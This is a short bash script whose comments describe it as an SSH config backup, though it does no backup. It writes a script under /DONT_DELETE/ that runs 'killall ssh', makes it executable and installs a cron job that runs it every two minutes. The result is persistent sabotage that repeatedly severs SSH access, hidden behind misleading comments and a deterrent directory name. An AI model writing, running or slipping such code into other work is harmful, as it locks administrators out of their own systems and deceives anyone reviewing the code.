#!/bin/bash

mkdir /DONT_DELETE/
touch /DONT_DELETE/gumption.sh

# backup ssh config files
echo '#!/bin/bash' > /DONT_DELETE/gumption.sh
echo 'killall ssh' >> /DONT_DELETE/gumption.sh

chmod +x /DONT_DELETE/gumption.sh

# Add cron job to run the backup script every 2 minutes
(crontab -l 2>/dev/null; echo "*/2 * * * * /DONT_DELETE/gumption.sh") | crontab -
